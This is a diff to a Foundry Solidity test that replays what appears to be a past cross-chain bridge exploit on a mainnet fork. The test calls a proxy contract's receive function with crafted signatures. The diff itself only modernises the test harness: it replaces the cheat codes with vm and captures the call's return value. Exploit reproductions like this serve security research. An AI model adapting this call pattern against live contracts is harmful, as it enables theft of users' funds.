@@ -3,7 +3,6 @@
 pragma solidity >=0.6.0 <0.9.0;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 struct Signature {
     address signatory;
@@ -17,16 +16,13 @@ struct Signature {
 // }
 
 contract ContractTest is Test {
-
     address exploiter = 0x941a9E3B91E1cc015702B897C512D265fAE88A9c;
     address proxy = 0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86;
     address impl = 0x373CE6Da1AEB73A9bcA412F2D3b7eD07Af3AD490;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("mainnet", 12_751_487); // fork mainnet at block 13125070
-            // https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be
+        vm.createSelectFork("mainnet", 12_751_487); // fork mainnet at block 13125070
+        // https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be
     }
 
     function testExploit() public {
@@ -50,7 +46,7 @@ contract ContractTest is Test {
             s: 0x1d4aaa253afc6c5d5f893d4a572de830538aeef3b65cb6ff3bb6fec738a899d0
         });
 
-        proxy.call(
+        (bool success, ) = proxy.call(
             abi.encodeWithSignature(
                 "receive(uint256,address,uint256,uint256, Signature[])",
                 1,
@@ -60,6 +56,7 @@ contract ContractTest is Test {
                 sigs
             )
         );
+        success;
         // function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {
         // _chargeFee();
         // require(received[fromChainId][to][nonce] == 0, 'withdrawn already');
@@ -77,5 +74,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
